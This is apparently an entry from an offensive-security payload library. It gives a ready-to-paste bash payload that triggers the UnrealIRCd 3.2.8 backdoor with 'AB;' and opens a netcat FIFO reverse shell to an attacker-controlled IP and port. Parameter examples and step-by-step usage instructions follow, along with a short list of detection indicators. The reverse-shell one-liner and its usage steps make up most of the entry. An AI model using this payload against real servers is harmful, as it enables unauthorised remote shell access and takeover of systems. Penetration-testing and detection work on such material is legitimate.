---
id: 78e467ec-3728-42bd-a8fe-90e52d647fc5
name: UnrealIRCd-Backdoor-Reverse-Shell-Payload
type: code
language: bash
verified: true
created_at: '2019-11-04T22:03:46.930592+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Linux
tags:
  - backdoor
  - payload
  - irc
  - reverse-shell
validated: true
---

# UnrealIRCd-Backdoor-Reverse-Shell-Payload

## Code

```bash
AB;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f
```

## Description

This payload is specifically crafted for the UnrealIRCd 3.2.8 backdoor, prepending the trigger 'AB;' to a netcat-based reverse shell command. When sent over an IRC connection, it executes arbitrary code on the server, establishing a reverse shell to the attacker.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | IP address of the attacker's listening machine | 192.168.1.100 |
| $_ATTACKER_PORT | Port on which the attacker is listening | 4444 |

## Usage

After connecting to the IRC server (e.g., via ncat), paste this payload directly into the session. It leverages the backdoor to run the embedded reverse shell. Requires a listener running on the attacker side beforehand.

## Detection

- IRC server logs showing commands prefixed with 'AB;'.
- Anomalous shell executions (/bin/sh) spawned from the IRC daemon process.
- Outbound netcat connections from the IRC server to external IPs.
- File system changes like FIFO creation in /tmp.

## Related

- [[procedures/Exploit-Backdoor-in-UnrealIRCd-3.2.8]]
